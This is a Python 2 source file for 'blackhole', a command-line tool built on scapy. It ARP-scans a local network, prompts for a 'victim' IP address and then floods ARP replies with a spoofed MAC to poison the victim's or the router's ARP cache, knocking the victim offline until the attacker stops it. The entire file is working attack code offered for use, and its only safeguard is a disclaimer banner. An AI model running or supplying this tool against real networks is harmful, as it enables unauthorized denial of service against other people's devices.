##########################################
#									     #
#									     #
# File name: blackhole.py                #
# Author: Siddhant Verma (siddver007)    #
# Thanks: [macvendors.co, ryland192000]  #
# Python Version: 2.7.x                  #
#										 #
#                  						 #
##########################################


import sys
from colorama import init
from termcolor import cprint
from pyfiglet import figlet_format
import os
from scapy.all import *
from time import sleep
import random
import traceback
import urllib2


def welcome():
	init(strip = not sys.stdout.isatty())
	cprint(figlet_format('blackhole', font = 'slant'),
		'green', attrs = ['bold'])
	cprint('Made by siddver007', 'yellow', attrs = ['bold'])
	print('\n')
	cprint('I AM NOT RESPONSIBLE FOR YOUR ACTIONS.' 
		+ ' DO NOT MISUSE IT.', 'red', attrs = ['bold'])
	print('\n\n')


def sniff(ipv4, gateway_ipv4, interface, re_sniff = 0):
	cprint("Sniffing...", 'blue', attrs = ['bold'])
	print('\n\n')
	resp,unans=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ipv4),
			timeout=2, verbose=False, iface=interface)
	print('IPv4          :          MAC          :          Vendor')
	print('........................................................')
	# not using this because now displaying MAC vendors too
	# resp.summary(lambda(s,r): r.sprintf("%ARP.psrc% : %Ether.src%") )
	ip_mac = {}
	for x in resp:
		ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
		try:
			vendor = urllib2.urlopen("https://macvendors.co/api/%s/pipe" %(str(x[1][Ether].src))).read()
			vendor = vendor.split('|')[0].replace('"', '')
			if 'no result' in vendor:
				vendor = ''
		except Exception, e:
			vendor = ''
			pass	
		print(str(x[1][ARP].psrc) + ' : ' + str(x[1][Ether].src) + ' : ' + vendor)
	if '/' not in ipv4:
		if bool(ip_mac):
			resp_g,unans_g=srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gateway_ipv4),
				timeout=2, verbose=False, iface=interface)
			for x in resp_g:
				ip_mac[str(x[1][ARP].psrc)] = str(x[1][Ether].src)
	if re_sniff == 1:
		blackhole(ip_mac, gateway_ipv4, interface, ipv4)
	else:
		return ip_mac	


def spoofMac(): 
    mac = [0x12, 0x34, 0x56, random.randint(0x00, 0x7f), random.randint(0x00, 0xff), random.randint(0x00, 0xff)] 
    return ':'.join(map(lambda x: "%02x" % x, mac))


def reverseBlackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac):
	if opt == 1:
		packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=gateway_mac, pdst=victim_ipv4, hwdst=victim_mac)
		for i in range(50):
			send(packet, verbose = False)
	else:
		packet = ARP(op=2, psrc=victim_ipv4, hwsrc=victim_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
		for i in range(50):
			send(packet, verbose = False)
	print('\n\n')		
	cprint('Restored. Enjoy. Exiting...', 'yellow', attrs = ['bold'])
	print('\n\n')


def blackhole(ip_mac, gateway_ipv4, interface, ipv4_or_ipv4cidr):
	print('\n\n')
	if not bool(ip_mac):
			print('No hosts found on LAN.\n')
			opt = int(str(raw_input('Do you wan\'t to scan again? [Choose 1 to scan again with the same values | Choose 2 to scan with new values] : ')))
			if opt == 1:
				print('\n\n')
				sniff(ipv4_or_ipv4cidr, gateway_ipv4, interface, 1)
			elif opt == 2:
				entry()	
			else:
				print('\n\n')
				cprint('Exiting...', 'yellow', attrs = ['bold'])
				print('\n\n')
	else:
		victim_ipv4 = str(raw_input('Enter victim\'s IPv4 : ')).strip()
		print('\n')		
		victim_mac = ip_mac[victim_ipv4]
		gateway_mac = ip_mac[gateway_ipv4]
		print('\n\n')
		cprint('Choose 1 to poison Victim\'s ARP Cache', 'yellow', attrs = ['bold'])
		print('\n')
		cprint('Choose 2 to poison Router\'s ARP Cache', 'yellow', attrs = ['bold'])
		print('\n')
		opt = int(str(raw_input('Input your choice : ')))
		print('\n\n')
		spoofed_mac = spoofMac()
		if opt == 1:
			packet = ARP(op=2, psrc=gateway_ipv4, hwsrc=spoofed_mac, pdst=victim_ipv4, hwdst=victim_mac)
			cprint('Blackholing ' + victim_ipv4 + ' [CTRL-C to stop]', 'blue', attrs = ['bold'])
			try:
				while True:
					send(packet, verbose = False)
			except KeyboardInterrupt:
				print('\n\n')
				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
				reverseBlackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
		elif opt == 2:
			packet = ARP(op=2, psrc=victim_ipv4, hwsrc=spoofed_mac, pdst=gateway_ipv4, hwdst=gateway_mac)
			cprint('Blackholing ' + victim_ipv4 + ' by poisoning Gateway\'s ARP Cache [CTRL-C to stop]', 'blue', attrs = ['bold'])
			try:
				while True:
					send(packet, verbose = False)
			except KeyboardInterrupt:
				print('\n\n')
				cprint("Stopped Blackholing. Restoring network...", 'blue', attrs = ['bold'])
				reverseBlackhole(opt, victim_ipv4, gateway_ipv4, victim_mac, gateway_mac)
		else:
			cprint("Wrong option. Exiting...", 'blue', attrs = ['bold'])


def entry():
	welcome()
	ipv4_or_ipv4cidr = str(raw_input('Enter IPv4 or CIDR (192.168.1.23 or 192.168.1.0/24) : ')).strip()
	print('\n')
	gateway_ipv4 = str(raw_input('Enter Gateway\'s IPv4 : ')).strip()
	print('\n')
	interface = str(raw_input('Enter interface : ')).strip()
	print('\n')
	ip_mac = sniff(ipv4_or_ipv4cidr, gateway_ipv4, interface)
	blackhole(ip_mac, gateway_ipv4, interface, ipv4_or_ipv4cidr)


if __name__ == '__main__':
	try:
		entry()
	except Exception, e:
		cprint("Some exception occurred. Please check your input and try again by restarting the tool. Anyways, printing the exception so that you can debug it.", 'red', attrs = ['bold'])
		print('\n\n')
		traceback.print_exc(file=sys.stdout)
		print('\n\n')
		cprint("Exiting now...", 'yellow', attrs = ['bold'])
		print('\n\n')